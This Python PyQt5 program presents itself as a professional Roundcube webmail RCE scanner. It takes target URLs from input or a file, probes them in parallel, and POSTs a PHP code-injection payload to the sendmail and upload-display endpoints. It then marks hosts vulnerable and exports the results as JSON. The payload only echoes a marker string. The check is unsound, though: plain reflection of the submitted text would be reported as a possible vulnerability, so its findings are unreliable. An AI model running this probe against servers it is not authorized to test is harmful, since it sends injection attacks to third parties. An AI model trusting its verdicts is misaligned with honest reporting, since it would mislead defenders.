#!/usr/bin/env python3
"""
EBS Roundcube Webmail RCE Vulnerability Scanner - Professional Edition with Modern GUI
"""

import sys
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import json
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                             QTabWidget, QTextEdit, QLineEdit, QPushButton, QLabel, 
                             QTableWidget, QTableWidgetItem, QHeaderView, QFileDialog,
                             QProgressBar, QSplitter, QComboBox)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QTextCursor, QColor, QFont

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

VERSION = "2.0.2-GUI"

class ScannerThread(QThread):
    update_signal = pyqtSignal(str, str, bool)
    progress_signal = pyqtSignal(int)
    request_signal = pyqtSignal(dict)

    def __init__(self, targets, threads=5, timeout=10):
        super().__init__()
        self.targets = targets
        self.threads = threads
        self.timeout = timeout
        self.user_agent = f"EBS RoundcubeScanner/{VERSION}"
        self.running = True

    def run(self):
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for target in self.targets:
                if not self.running:
                    break
                futures.append(executor.submit(self.check_target, target))
            
            for i, future in enumerate(futures):
                if not self.running:
                    break
                target, is_vulnerable, message = future.result()
                self.update_signal.emit(target, message, is_vulnerable)
                self.progress_signal.emit(int((i+1)/len(self.targets)*100))

    def check_target(self, target):
        try:
            target = target.rstrip('/')
            
            # Check if Roundcube exists
            login_url = f"{target}/?_task=login"
            try:
                response = requests.get(
                    login_url,
                    headers={'User-Agent': self.user_agent},
                    verify=False,
                    timeout=self.timeout,
                    allow_redirects=False
                )
                
                self.request_signal.emit({
                    'url': login_url,
                    'method': 'GET',
                    'status': response.status_code,
                    'headers': dict(response.headers),
                    'response': response.text[:500] + '...' if len(response.text) > 500 else response.text
                })
                
                if response.status_code != 200 or 'roundcube' not in response.text.lower():
                    return (target, False, "Roundcube not detected")
            except Exception as e:
                self.request_signal.emit({
                    'url': login_url,
                    'method': 'GET',
                    'error': str(e)
                })
                return (target, False, f"Connection failed: {str(e)}")
            
            # Check vulnerable endpoints
            endpoints = [
                ("/?_task=utils&_action=sendmail", "POST"),
                ("/?_task=settings&_action=upload-display", "POST")
            ]
            
            for endpoint, method in endpoints:
                test_url = target + endpoint
                payload = {
                    "_to": "test@example.com",
                    "_subject": "Vulnerability Test",
                    "_text": "<?php echo 'VULN_TEST_'.md5('roundcube'); ?>"
                }
                
                try:
                    if method == "POST":
                        response = requests.post(
                            test_url,
                            data=payload,
                            headers={'User-Agent': self.user_agent},
                            verify=False,
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                    else:
                        response = requests.get(
                            test_url,
                            headers={'User-Agent': self.user_agent},
                            verify=False,
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                    
                    self.request_signal.emit({
                        'url': test_url,
                        'method': method,
                        'payload': payload if method == "POST" else None,
                        'status': response.status_code,
                        'headers': dict(response.headers),
                        'response': response.text[:500] + '...' if len(response.text) > 500 else response.text
                    })
                    
                    if response.status_code == 200 and 'VULN_TEST_' in response.text:
                        md5_check = '7be3290560814f0a5681d7e303eee02e'
                        if md5_check in response.text:
                            return (target, True, f"Vulnerable (RCE via {endpoint})")
                        return (target, True, f"Potential vulnerability (unverified response via {endpoint})")
                    
                except requests.exceptions.RequestException as e:
                    self.request_signal.emit({
                        'url': test_url,
                        'method': method,
                        'error': str(e)
                    })
                    continue
            
            return (target, False, "No vulnerability detected")
            
        except Exception as e:
            self.request_signal.emit({
                'url': target,
                'error': f"Scan error: {str(e)}"
            })
            return (target, False, f"Scan error: {str(e)}")

    def stop(self):
        self.running = False

class RoundcubeScannerGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle(f"EBS Roundcube RCE Scanner v{VERSION} - Professional Edition")
        self.setGeometry(100, 100, 1200, 800)
        
        # Central widget
        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)
        
        # Main layout
        self.main_layout = QVBoxLayout()
        self.central_widget.setLayout(self.main_layout)
        
        # Create tabs
        self.tabs = QTabWidget()
        self.main_layout.addWidget(self.tabs)
        
        # Scan tab
        self.scan_tab = QWidget()
        self.tabs.addTab(self.scan_tab, "Scan")
        
        # Request log tab
        self.request_tab = QWidget()
        self.tabs.addTab(self.request_tab, "Request Log")
        
        # Results tab
        self.results_tab = QWidget()
        self.tabs.addTab(self.results_tab, "Results")
        
        # Setup scan tab
        self.setup_scan_tab()
        
        # Setup request log tab
        self.setup_request_tab()
        
        # Setup results tab
        self.setup_results_tab()
        
        # Status bar
        self.status_bar = self.statusBar()
        self.progress_bar = QProgressBar()
        self.status_bar.addPermanentWidget(self.progress_bar)
        self.progress_bar.setVisible(False)
        
        # Scanner thread
        self.scanner_thread = None
        
        # Dark theme
        self.set_dark_theme()
        
    def set_dark_theme(self):
        self.setStyleSheet("""
            QMainWindow {
                background-color: #2D2D2D;
            }
            QTextEdit, QTableWidget {
                background-color: #1E1E1E;
                color: #D4D4D4;
                border: 1px solid #3E3E3E;
            }
            QTabWidget::pane {
                border: 1px solid #3E3E3E;
                background: #2D2D2D;
            }
            QTabBar::tab {
                background: #2D2D2D;
                color: #D4D4D4;
                padding: 8px;
                border: 1px solid #3E3E3E;
                border-bottom: none;
            }
            QTabBar::tab:selected {
                background: #3E3E3E;
            }
            QPushButton {
                background-color: #3E3E3E;
                color: #D4D4D4;
                border: 1px solid #5E5E5E;
                padding: 5px;
            }
            QPushButton:hover {
                background-color: #5E5E5E;
            }
            QPushButton:pressed {
                background-color: #7E7E7E;
            }
            QLineEdit {
                background-color: #1E1E1E;
                color: #D4D4D4;
                border: 1px solid #3E3E3E;
                padding: 5px;
            }
            QLabel {
                color: #D4D4D4;
            }
            QHeaderView::section {
                background-color: #3E3E3E;
                color: #D4D4D4;
                padding: 5px;
                border: 1px solid #5E5E5E;
            }
            QTableWidget {
                gridline-color: #3E3E3E;
            }
        """)

    def setup_scan_tab(self):
        layout = QVBoxLayout()
        self.scan_tab.setLayout(layout)
        
        # Input section
        input_layout = QHBoxLayout()
        
        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("Enter target URL (e.g., https://example.com/webmail)")
        input_layout.addWidget(self.target_input, 1)
        
        self.add_button = QPushButton("Add")
        self.add_button.clicked.connect(self.add_target)
        input_layout.addWidget(self.add_button)
        
        self.load_button = QPushButton("Load from File")
        self.load_button.clicked.connect(self.load_targets)
        input_layout.addWidget(self.load_button)
        
        layout.addLayout(input_layout)
        
        # Targets list
        self.targets_list = QTextEdit()
        self.targets_list.setPlaceholderText("Target URLs will appear here...")
        layout.addWidget(self.targets_list)
        
        # Options
        options_layout = QHBoxLayout()
        
        self.threads_label = QLabel("Threads:")
        options_layout.addWidget(self.threads_label)
        
        self.threads_input = QComboBox()
        self.threads_input.addItems([str(i) for i in range(1, 21)])
        self.threads_input.setCurrentText("5")
        options_layout.addWidget(self.threads_input)
        
        self.timeout_label = QLabel("Timeout (s):")
        options_layout.addWidget(self.timeout_label)
        
        self.timeout_input = QComboBox()
        self.timeout_input.addItems(["5", "10", "15", "20", "30"])
        self.timeout_input.setCurrentText("10")
        options_layout.addWidget(self.timeout_input)
        
        options_layout.addStretch()
        
        layout.addLayout(options_layout)
        
        # Action buttons
        button_layout = QHBoxLayout()
        
        self.scan_button = QPushButton("Start Scan")
        self.scan_button.clicked.connect(self.start_scan)
        button_layout.addWidget(self.scan_button)
        
        self.stop_button = QPushButton("Stop Scan")
        self.stop_button.clicked.connect(self.stop_scan)
        self.stop_button.setEnabled(False)
        button_layout.addWidget(self.stop_button)
        
        self.clear_button = QPushButton("Clear Targets")
        self.clear_button.clicked.connect(self.clear_targets)
        button_layout.addWidget(self.clear_button)
        
        layout.addLayout(button_layout)

    def setup_request_tab(self):
        layout = QVBoxLayout()
        self.request_tab.setLayout(layout)
        
        splitter = QSplitter(Qt.Vertical)
        
        # Request table
        self.request_table = QTableWidget()
        self.request_table.setColumnCount(5)
        self.request_table.setHorizontalHeaderLabels(["Method", "URL", "Status", "Length", "Time"])
        self.request_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.request_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.request_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.request_table.doubleClicked.connect(self.show_request_details)
        
        splitter.addWidget(self.request_table)
        
        # Request details
        self.request_details = QTextEdit()
        self.request_details.setReadOnly(True)
        splitter.addWidget(self.request_details)
        
        splitter.setSizes([400, 200])
        layout.addWidget(splitter)
        
        # Clear button
        self.clear_requests_button = QPushButton("Clear Log")
        self.clear_requests_button.clicked.connect(self.clear_requests)
        layout.addWidget(self.clear_requests_button)

    def setup_results_tab(self):
        layout = QVBoxLayout()
        self.results_tab.setLayout(layout)
        
        splitter = QSplitter(Qt.Vertical)
        
        # Results table
        self.results_table = QTableWidget()
        self.results_table.setColumnCount(3)
        self.results_table.setHorizontalHeaderLabels(["Target", "Status", "Details"])
        self.results_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.results_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.results_table.setEditTriggers(QTableWidget.NoEditTriggers)
        
        splitter.addWidget(self.results_table)
        
        # Results summary
        self.results_summary = QTextEdit()
        self.results_summary.setReadOnly(True)
        splitter.addWidget(self.results_summary)
        
        splitter.setSizes([400, 100])
        layout.addWidget(splitter)
        
        # Action buttons
        button_layout = QHBoxLayout()
        
        self.export_button = QPushButton("Export Results")
        self.export_button.clicked.connect(self.export_results)
        button_layout.addWidget(self.export_button)
        
        self.clear_results_button = QPushButton("Clear Results")
        self.clear_results_button.clicked.connect(self.clear_results)
        button_layout.addWidget(self.clear_results_button)
        
        layout.addLayout(button_layout)

    def add_target(self):
        target = self.target_input.text().strip()
        if target:
            current = self.targets_list.toPlainText()
            if current:
                self.targets_list.setPlainText(current + "\n" + target)
            else:
                self.targets_list.setPlainText(target)
            self.target_input.clear()

    def load_targets(self):
        file_name, _ = QFileDialog.getOpenFileName(self, "Open Targets File", "", "Text Files (*.txt);;All Files (*)")
        if file_name:
            with open(file_name, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
                self.targets_list.setPlainText("\n".join(targets))

    def clear_targets(self):
        self.targets_list.clear()

    def start_scan(self):
        targets = self.targets_list.toPlainText().split('\n')
        targets = [t.strip() for t in targets if t.strip()]
        
        if not targets:
            self.status_bar.showMessage("No targets to scan!", 3000)
            return
        
        # Clear previous results
        self.results_table.setRowCount(0)
        self.results_summary.clear()
        
        # Setup progress
        self.progress_bar.setValue(0)
        self.progress_bar.setVisible(True)
        
        # Disable/enable buttons
        self.scan_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        
        # Start scanner thread
        self.scanner_thread = ScannerThread(
            targets=targets,
            threads=int(self.threads_input.currentText()),
            timeout=int(self.timeout_input.currentText())
        )
        self.scanner_thread.update_signal.connect(self.update_result)
        self.scanner_thread.progress_signal.connect(self.update_progress)
        self.scanner_thread.request_signal.connect(self.log_request)
        self.scanner_thread.finished.connect(self.scan_finished)
        self.scanner_thread.start()
        
        self.status_bar.showMessage(f"Scanning {len(targets)} targets...")

    def stop_scan(self):
        if self.scanner_thread:
            self.scanner_thread.stop()
            self.scanner_thread.wait()
            self.status_bar.showMessage("Scan stopped by user", 3000)

    def scan_finished(self):
        self.progress_bar.setVisible(False)
        self.scan_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        
        # Generate summary
        row_count = self.results_table.rowCount()
        vulnerable = 0
        for i in range(row_count):
            if "Vulnerable" in self.results_table.item(i, 1).text():
                vulnerable += 1
        
        summary = f"Scan completed at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        summary += f"Total targets: {row_count}\n"
        summary += f"Vulnerable targets: {vulnerable}\n"
        summary += f"Safe targets: {row_count - vulnerable}"
        
        self.results_summary.setPlainText(summary)
        self.status_bar.showMessage("Scan completed", 3000)

    def update_result(self, target, message, is_vulnerable):
        row = self.results_table.rowCount()
        self.results_table.insertRow(row)
        
        # Target
        self.results_table.setItem(row, 0, QTableWidgetItem(target))
        
        # Status
        status_item = QTableWidgetItem("VULNERABLE" if is_vulnerable else "SAFE")
        if is_vulnerable:
            status_item.setForeground(QColor(255, 0, 0))  # Red
        else:
            status_item.setForeground(QColor(0, 255, 0))  # Green
        self.results_table.setItem(row, 1, status_item)
        
        # Details
        self.results_table.setItem(row, 2, QTableWidgetItem(message))
        
        # Auto-scroll to bottom
        self.results_table.scrollToBottom()

    def update_progress(self, value):
        self.progress_bar.setValue(value)

    def log_request(self, request_data):
        row = self.request_table.rowCount()
        self.request_table.insertRow(row)
        
        # Method
        method = request_data.get('method', 'ERROR')
        self.request_table.setItem(row, 0, QTableWidgetItem(method))
        
        # URL
        url = request_data.get('url', '')
        self.request_table.setItem(row, 1, QTableWidgetItem(url))
        
        # Status
        status = str(request_data.get('status', ''))
        if 'error' in request_data:
            status = "ERROR"
            self.request_table.item(row, 0).setForeground(QColor(255, 165, 0))  # Orange for errors
        self.request_table.setItem(row, 2, QTableWidgetItem(status))
        
        # Length
        response = request_data.get('response', '')
        length = f"{len(response)} chars" if response else ''
        self.request_table.setItem(row, 3, QTableWidgetItem(length))
        
        # Time
        time = datetime.now().strftime('%H:%M:%S')
        self.request_table.setItem(row, 4, QTableWidgetItem(time))
        
        # Store full data as user data
        self.request_table.item(row, 0).setData(Qt.UserRole, request_data)
        
        # Auto-scroll to bottom
        self.request_table.scrollToBottom()

    def show_request_details(self):
        row = self.request_table.currentRow()
        if row >= 0:
            request_data = self.request_table.item(row, 0).data(Qt.UserRole)
            details = "=== Request Details ===\n"
            
            if 'error' in request_data:
                details += f"Error: {request_data['error']}\n"
            else:
                details += f"Method: {request_data.get('method', '')}\n"
                details += f"URL: {request_data.get('url', '')}\n"
                details += f"Status: {request_data.get('status', '')}\n"
                
                if 'payload' in request_data:
                    details += "\n=== Payload ===\n"
                    details += json.dumps(request_data['payload'], indent=2) + "\n"
                
                details += "\n=== Headers ===\n"
                details += json.dumps(request_data.get('headers', {}), indent=2) + "\n"
                
                details += "\n=== Response ===\n"
                details += request_data.get('response', '') + "\n"
            
            self.request_details.setPlainText(details)
            self.request_details.moveCursor(QTextCursor.Start)

    def clear_requests(self):
        self.request_table.setRowCount(0)
        self.request_details.clear()

    def clear_results(self):
        self.results_table.setRowCount(0)
        self.results_summary.clear()

    def export_results(self):
        file_name, _ = QFileDialog.getSaveFileName(self, "Save Results", "", "JSON Files (*.json);;All Files (*)")
        if file_name:
            results = {
                "metadata": {
                    "tool": "Roundcube RCE Scanner",
                    "version": VERSION,
                    "date": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    "total_targets": self.results_table.rowCount()
                },
                "results": []
            }
            
            for i in range(self.results_table.rowCount()):
                results["results"].append({
                    "target": self.results_table.item(i, 0).text(),
                    "status": self.results_table.item(i, 1).text(),
                    "message": self.results_table.item(i, 2).text()
                })
            
            with open(file_name, 'w') as f:
                json.dump(results, f, indent=2)
            
            self.status_bar.showMessage(f"Results exported to {file_name}", 3000)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setFont(QFont("Segoe UI", 10))
    window = RoundcubeScannerGUI()
    window.show()
    sys.exit(app.exec_())
